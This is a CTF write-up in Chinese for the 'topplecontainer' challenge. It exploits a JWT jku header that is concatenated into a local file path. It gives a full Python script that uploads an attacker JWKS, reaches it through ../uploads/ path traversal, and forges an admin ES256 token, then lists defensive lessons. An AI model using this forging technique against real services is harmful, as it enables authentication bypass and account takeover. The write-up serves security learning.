# topplecontainer

## 题目简述

文件分享站使用 ES256 JWT。token 头包含 `kid` 和 `jku`，验证函数把用户提供的 `jku` 直接拼接到 `static/` 后读取 JWKS：

```python
with open(f"static/{jku}") as f:
    keys = json.load(f)["keys"]
```

网站同时允许登录用户上传任意文件到 `uploads/<user_id>/<file_id>`。因此可以上传攻击者自己的 JWKS，再用 `../uploads/...` 路径穿越让验证器信任攻击者公钥，签发 `id=admin` 的 token。

## 解题过程

先生成 P-256 密钥对，把公钥转换为 JWK。服务只要求头部 `kid` 能在所读 JWKS 中找到，不要求它等于官方常量，所以可自行计算并同时写入 token 与 JWKS：

```python
import json, jwt, requests
from hashlib import sha256
from io import BytesIO
from cryptography.hazmat.primitives.asymmetric import ec

base = "https://TARGET"
private = ec.generate_private_key(ec.SECP256R1())
jwk = json.loads(jwt.algorithms.ECAlgorithm.to_jwk(private.public_key()))
kid = sha256(json.dumps(jwk, sort_keys=True).encode()).hexdigest()
jwk["kid"] = kid
jwks = {"keys": [jwk]}

session = requests.Session()
session.post(base + "/register", data={"username": "guest"})
response = session.post(
    base + "/upload",
    files={"file": ("keys.json", BytesIO(json.dumps(jwks).encode()))},
)

# 重定向后的查询参数 path 给出 <user_uuid>/<file_uuid>。
uploaded_path = response.url.split("path=", 1)[1]
jku = "../uploads/" + uploaded_path

token = jwt.encode(
    {"id": "admin"},
    private,
    algorithm="ES256",
    headers={"kid": kid, "jku": jku},
)
print(requests.get(base + "/flag", cookies={"token": token}).text)
```

验证器实际打开 `static/../uploads/<user>/<file>`，从中加载攻击者公钥，并成功验证攻击者签名。`/flag` 只看已验证 payload 中的 `id`，于是返回：

```text
tjctf{dont_trust_users_ever_ever_ever_1bd8eed2}
```

## 方法总结

- JWT 的 `jku` 是信任根选择器，不能由未验证 token 任意控制，更不能作为本地文件路径直接拼接。
- 算法固定为 ES256 并不能阻止攻击，因为签名数学上完全有效，错误在于服务器信任了攻击者提供的公钥。
- 应将 JWKS 地址或公钥固定在服务配置中，严格匹配允许的 `kid`，并对任何路径做规范化后验证仍位于预期目录。
